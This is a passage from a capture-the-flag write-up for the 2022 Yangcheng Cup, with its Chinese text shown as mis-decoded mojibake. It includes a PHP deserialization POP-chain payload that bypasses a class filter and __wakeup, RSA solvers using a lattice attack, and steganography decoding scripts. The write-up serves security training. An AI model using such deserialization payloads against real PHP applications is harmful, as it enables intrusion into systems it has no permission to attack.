<p>è¿™ä¸ªé¢˜ä¸€çœ‹å°±æ˜¯éœ€è¦å»è°ƒé‚£ä¸ª<code>getFlag</code>æ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œ<code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>çœ‹åˆ°äº†è¿‡æ»¤è¯´æ˜ç›´æ¥è°ƒç”¨è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯éœ€è¦é€šè¿‡Funç±»çš„å›è°ƒå‡½æ•°å»è°ƒç”¨çš„ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡è¿‡æ»¤ã€‚</p>
<p>åŒæ—¶è¿˜æœ‰ä¸ªé—®é¢˜å°±æ˜¯weakupï¼Œçœ‹äº†ä¸€çœ¼phpç‰ˆæœ¬ï¼Œphp7.3å¯èƒ½æ˜¯è¿˜æœ‰ç»•è¿‡ï¼Œä¸ç„¶è¿™é¢˜æ²¡æ³•åšäº†ã€‚</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(12).PNG" alt="1280X1280 (12)"></p>
<p>ç„¶åæˆ‘ä»¬å°±æ˜¯éœ€è¦æŒ–é“¾å­ï¼Œè¿™é‡Œè¿˜æœ‰ä¸ªå°é—®é¢˜å°±æ˜¯<code>throw new Exception(&quot;no pop&quot;);</code>ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œç»•è¿‡ä»–çš„æ–¹å¼æ˜¯è¦è®©ååºåˆ—åŒ–çš„å†…å®¹æœ‰é”™ï¼Œè¿™é‡Œæˆ‘ä¸€ç›´ä¹ æƒ¯æ˜¯ç”¨æ•°ç»„å»æ”¹ç»•è¿‡ï¼Œä½†æ˜¯å› ä¸ºè¿™é‡Œæœ€åæ˜¯è¦æ”¹å¤§å°ç»•weakupçš„æ‰€ä»¥ä¸ç”¨æ•°ç»„ä¹Ÿè¡Œã€‚è¿™é‡Œ<code>$b-&gt;p=&quot;getFlag&quot;;</code>ä¹Ÿä¸éœ€è¦ä¸€å®šèµ‹å€¼<code>getFlag</code>ï¼Œåªè¦æ˜¯éšä¾¿ä¸€ä¸ªBé‡Œé¢æ²¡æœ‰çš„æ–¹æ³•å°±è¡Œï¼Œè¿™é‡Œä¸€å¼€å§‹æ˜¯ç›´æ¥è°ƒçš„Testï¼Œæ‰€ä»¥èµ‹äº†è¿™ä¸ªï¼Œæ‡’å¾—æ”¹äº†ï¼Œè¿™é‡Œç§æœ‰æ–¹æ³•è®°å¾—åŠ %00æˆ–è€…urlç¼–ç ä¸€ä¸‹ã€‚è¿˜æœ‰è¦æ”¹ä¸€ä¸‹Bé‚£é‡Œæ”¹å¤§ä¸€ç‚¹ï¼Œæ”¹æˆäº†3.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?pop=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Fun&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00Fun%00func&quot;</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(13).PNG" alt="img"></p>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="easyrsa"><a class="markdownIt-Anchor" href="#easyrsa"></a> EasyRsa</h3>
<p>å””ï¼Œæ‰¾åˆ°ä¸€ä¸ªç´ æ•°å› å­ï¼Œç›´æ¥åˆ†è§£nã€‚ç„¶åå°±æ˜¯å¸¸è§„æ“ä½œï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file  = <span class="string">&quot;D:\\æ¡Œé¢\\CRYPTOé™„ä»¶\\task\\output.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">A = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    A.append(n)</span><br><span class="line">A = A[::-<span class="number">1</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c=<span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c,d,n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A:</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="keyword">assert</span> p*q == n</span><br><span class="line">    phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">    d = inverse(e,phi)</span><br><span class="line">    m = decrypt(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(m,e,n)==c)</span><br><span class="line">    c = m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>
<h3 id="lrsa"><a class="markdownIt-Anchor" href="#lrsa"></a> <strong>LRSA</strong></h3>
<p>æ ¹æ®</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>58</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mi>P</mi><mo>+</mo><mi>q</mi><mo>âˆ’</mo><mi>t</mi><mo>âˆ’</mo><mi>k</mi><mi>Q</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">(p-58)*P+q-t - kQ=0
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69841em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></span></p>
<p>æ„é€ æ ¼å­</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>P</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>Q</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix}
1 &amp; 0 &amp; P\\ 
0 &amp; 1 &amp; 1\\
0 &amp; 0 &amp; Q
\end{pmatrix}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M291 0 H417 V300 H291 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â›</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â </span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M457 0 H583 V300 H457 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>æˆ‘ä»¬éœ€è¦çš„å‘é‡(p-58,q-44,k)é‡çº§å¤§æ¦‚åœ¨1024bitï¼Œé‚£ä¹ˆéœ€è¦å¯¹æˆ‘ä»¬æ„é€ çš„latticeè¿›è¡Œæ”¾å¤§</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>1017</mn></msup><mi>P</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1017</mn></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>1017</mn></msup><mi>Q</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix} 1 &amp; 0 &amp; 2^{1017}P\\  0 &amp; 1 &amp; 2^{1017}\\ 0 &amp; 0 &amp; 2^{1017}Q \end{pmatrix}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M291 0 H417 V300 H291 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â›</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">Q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â </span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M457 0 H583 V300 H457 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>ä½¿ç”¨LLLç®—æ³•å¾—åˆ°(p-58,q-44,k)ï¼Œå³å¯åˆ†è§£nã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">B=<span class="number">1023</span></span><br><span class="line">PPQ=<span class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ=<span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t=<span class="number">44</span></span><br><span class="line">c=<span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">PQ = gmpy2.gcd(PPQ,PQQ)</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">p = <span class="number">80736411146583842306585010871034886981016840349026602734742256246556342668178774083233822097872779308174897649383396380481655663281333047577768952571915605685701400990749928642136680236367785948214890529631428970999122918591632651324318444462622996015719163492064450044087392474349767300242266723293755137205</span>+<span class="number">58</span></span><br><span class="line">q = <span class="number">71239161441539946834999944364158306978517617517717217001776063773301330324729178632534286023377366747004115034635139042058644768011502688969022553791977558750633767627495955645170437100983708648876951588485253787441732757259210010467734037546118780321368088487269039555130213851691659851510403573663333586407</span>+<span class="number">44</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,p*q)))</span><br></pre></td></tr></table></figure>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="ç­¾åˆ°"><a class="markdownIt-Anchor" href="#ç­¾åˆ°"></a> ç­¾åˆ°</h3>
<p>ç›´æ¥cipheyè¯†åˆ«è§£ç å°±OK</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/14.png" alt="14"></p>
<h3 id="where_is_secret"><a class="markdownIt-Anchor" href="#where_is_secret"></a> where_is_secret</h3>
<p>æ‹¿åˆ°é™„ä»¶ï¼Œvig.txtçš„å†…å®¹ä¸€çœ¼ä¸çœŸï¼Œvigenereç¼–ç ï¼ˆ<a href="https://www.guballa.de/vigenere-solver%EF%BC%89%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%8B%BF%E5%88%B0%E8%A7%A3%E5%BC%80%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%BE%97%E5%88%B0%E4%B8%80%E5%BC%A0bmp%E5%9B%BE%E7%89%87%EF%BC%8C%E7%BB%93%E5%90%88hint%E7%9A%84%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%86%99%E8%AF%BB%E5%83%8F%E7%B4%A0%E7%82%B9%E8%84%9A%E6%9C%AC">https://www.guballa.de/vigenere-solverï¼‰åœ¨çº¿è§£å¯†ï¼Œæ‹¿åˆ°è§£å¼€å‹ç¼©åŒ…å¾—åˆ°ä¸€å¼ bmpå›¾ç‰‡ï¼Œç»“åˆhintçš„è„šæœ¬ï¼Œå†™è¯»åƒç´ ç‚¹è„šæœ¬</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">text</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;out.bmp&quot;</span>)</span><br><span class="line">    imgdata = np.array(img)</span><br><span class="line">    index = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">            m = <span class="built_in">int</span>(imgdata[x][y][<span class="number">1</span>])</span><br><span class="line">            n = <span class="built_in">int</span>(imgdata[x][y][<span class="number">2</span>])</span><br><span class="line">            <span class="built_in">str</span> = m&lt;&lt;<span class="number">8</span></span><br><span class="line">            <span class="built_in">str</span> += n</span><br><span class="line">            file.write(<span class="built_in">chr</span>(<span class="built_in">str</span>))</span><br><span class="line">    file.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    decode()</span><br></pre></td></tr></table></figure>
<p>æ‰“å¼€è¾“å‡ºçš„æ–‡æœ¬ï¼Œå‘ç°flagè¢«æ‰“æ•£åœ¨æ–‡æœ¬ä¸­ï¼Œå†™ä¸€ä¸ªå­—æ¯è¯†åˆ«è„šæœ¬,æ‡’äº†ï¼Œæ²¡å†™æ­£åˆ™ã€‚ã€‚</p>
